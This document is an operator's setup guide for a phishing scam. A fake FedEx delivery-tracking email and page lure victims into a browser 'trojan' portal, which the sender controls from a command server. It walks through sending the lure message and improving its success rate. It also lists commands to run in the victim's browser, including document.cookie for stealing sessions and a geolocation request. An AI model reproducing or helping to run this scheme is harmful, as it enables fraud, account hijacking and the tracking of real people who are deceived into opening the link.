🚚 TROJAN HORSE DELIVERY SCAM - SETUP INSTRUCTIONS
==================================================

📋 OVERVIEW
-----------
This is a social engineering trojan that uses a fake FedEx delivery notification
to trick victims into providing access to their browser. The setup uses three 
components working together.

📁 COMPONENTS
-------------
1. delivery_tracker.py - FedEx delivery interface (port 9000)
2. update_portal.py - Trojan control panel (port 8080) 
3. server.py - Command server (port 4444)
4. delivery_message.txt - Email template for victims

🎯 VICTIM WORKFLOW
------------------
1. Victim receives email with delivery tracker link
2. Victim opens link → sees professional FedEx interface
3. Victim enters "tracking number" (which is actually tunnel password)
4. If correct → redirected to trojan portal
5. Trojan activates in their browser
6. You can execute commands remotely

📧 SENDING TO VICTIMS
--------------------
Send the delivery tracker tunnel URL from step 6.
Include the tunnel password in your message as the "tracking number".
Use delivery_message.txt as template.

Example message:
"Your FedEx package delivery failed. Track with number: 185.234.142.68
Link: https://blue-delivery-tracker.loca.lt"

💻 CONTROLLING VICTIMS
---------------------
Once a victim is infected:
1. Commands appear in Terminal 2 (update_portal.py)
2. Type commands to execute in victim's browser
3. Results appear in the same terminal

Example commands:
- navigator.geolocation.getCurrentPosition(pos => console.log(pos))
- window.location.href
- document.cookie
- alert('Hello from attacker!')

⚠️ IMPORTANT NOTES
------------------
- Both portals need separate tunnels (one for delivery, one for trojan)
- Tunnel passwords change each time you restart
- Update TUNNEL_URL in delivery_tracker.py when tunnel changes
- Use professional language in delivery messages for better success rate
- Test the full workflow before sending to real targets

🔐 AUTHENTICATION FLOW
---------------------
1. Victim enters tracking number on delivery page
2. If tracking number matches TUNNEL_PASSWORD → authenticated
3. Delivery tracker redirects to trojan portal
4. Trojan bypass headers attempt to skip tunnel password
5. If bypass fails, victim sees tunnel password screen
6. Trojan activates once portal loads

🛠️ TROUBLESHOOTING
------------------
- If "command not found: python" → use python3
- If Flask not installed → pip3 install --break-system-packages flask
- If tunnel expires → restart tunnel and update TUNNEL_URL
- If victim gets "Invalid tracking" → check TUNNEL_PASSWORD matches
- If commands don't execute → check server.py is running on port 4444
